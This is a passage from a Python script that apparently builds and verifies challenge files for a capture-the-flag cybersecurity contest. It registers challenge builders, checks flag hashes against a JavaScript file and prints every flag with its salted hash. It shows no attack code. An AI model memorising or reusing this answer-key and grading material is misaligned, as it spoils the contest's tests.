    risks.sort(reverse=True)
    assert "CTF{%s_%s}" % (risks[0][1], risks[0][2]) == flag
    assert risks[0][0] == 15


def build_trivia_files():
    # Trivia questions are answered directly in the browser, no files needed.
    return


BUILDERS = [
    ("esp-base64-rot13", build_esp_base64_rot13),
    ("esp-hash-md5", build_esp_hash_md5),
    ("esp-shadow-john", build_esp_shadow_john),
    ("esp-xor-key", build_esp_xor_key),
    ("net-subnetting", build_net_subnetting),
    ("net-nmap-output", build_net_nmap_output),
    ("net-pcap-ftp", build_net_pcap_ftp),
    ("net-iptables", build_net_iptables),
    ("net-pcap-dns", build_net_pcap_dns),
    ("end-authlog", build_end_authlog),
    ("end-persistence", build_end_persistence),
    ("end-obfuscated-script", build_end_obfuscated_script),
    ("end-image-hidden", build_end_image_hidden),
    ("vam-risk-matrix", build_vam_risk_matrix),
    ("trivia-cia", build_trivia_files),
    ("trivia-ssh-port", build_trivia_files),
    ("trivia-https-port", build_trivia_files),
    ("trivia-nmap-sv", build_trivia_files),
    ("trivia-cvss", build_trivia_files),
    ("tb-vuln-vs-threat", build_trivia_files),
]


# --------------------------------------------------------------------------
# Verification against js/challenges.js
# --------------------------------------------------------------------------


def parse_challenges_js(path):
    """Extract {id: flagHash} pairs from js/challenges.js."""
    if not os.path.exists(path):
        return {}
    with open(path, "r", encoding="utf-8") as handle:
        text = handle.read()
    hashes = {}
    pattern = re.compile(r"id:\s*['\"]([^'\"]+)['\"].*?flagHash:\s*['\"]([0-9a-fA-F]{64})['\"]",
                          re.DOTALL)
    for match in pattern.finditer(text):
        hashes[match.group(1)] = match.group(2).lower()
    return hashes


def verify_challenges_js():
    hashes = parse_challenges_js(CHALLENGES_JS)
    if not hashes:
        print("[verify] could not parse %s" % CHALLENGES_JS)
        return False
    ok = True
    for challenge_id, flag in FLAGS.items():
        case_sensitive = challenge_id not in TRIVIA_IDS
        expected = flag_hash(flag, case_sensitive)
        if challenge_id not in hashes:
            print("[verify] MISSING challenge %s in challenges.js" % challenge_id)
            ok = False
            continue
        if hashes[challenge_id] != expected:
            print("[verify] HASH MISMATCH %s\n  challenges.js: %s\n  expected   : %s"
                  % (challenge_id, hashes[challenge_id], expected))
            ok = False
    for challenge_id in hashes:
        if challenge_id not in FLAGS:
            print("[verify] WARNING challenges.js contains unknown id %s" % challenge_id)
    return ok


# --------------------------------------------------------------------------
# Entry point
# --------------------------------------------------------------------------


def main(argv):
    if not os.path.isdir(FILES_DIR):
        os.makedirs(FILES_DIR)

    print("=" * 78)
    print("IT Skills Olympics 2026 - Cybersecurity Category")
    print("Generating challenge artefacts in %s" % FILES_DIR)
    print("=" * 78)

    for challenge_id, builder in BUILDERS:
        builder()
        print("  [ok] %s" % challenge_id)

    summary = []
    print("-" * 78)
    print("%-24s %-9s %s" % ("CHALLENGE", "MODE", "FLAG / HASH"))
    print("-" * 78)
    for challenge_id in FLAGS:
        case_sensitive = challenge_id not in TRIVIA_IDS
        flag = FLAGS[challenge_id]
        digest = flag_hash(flag, case_sensitive)
        summary.append({
            "id": challenge_id,
            "flag": flag,
            "caseSensitive": case_sensitive,
            "flagHash": digest,
            "altHashes": [flag_hash(alt, case_sensitive) for alt in ALT_ANSWERS.get(challenge_id, [])],
        })
        print("%-24s %-9s %s" % (challenge_id, "case" if case_sensitive else "trivia", flag))
        print("%-24s %-9s sha256=%s" % ("", "", digest))
        for alt in ALT_ANSWERS.get(challenge_id, []):
            print("%-24s %-9s alt    =%s  (%s)" % ("", "", flag_hash(alt, case_sensitive), alt))
    print("-" * 78)
    print("salt: %s   (keep in sync with js/config.js)" % SALT)
    print("total graded points available: 1500 (19 graded challenges)")

    if "--json" in argv:
        print(json.dumps(summary, indent=2))

    if "--verify" in argv:
        print("-" * 78)
        if verify_challenges_js():
            print("[verify] every flagHash in js/challenges.js matches the real flag.")
        else:
            print("[verify] FAILED - see messages above.")
            return 1
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
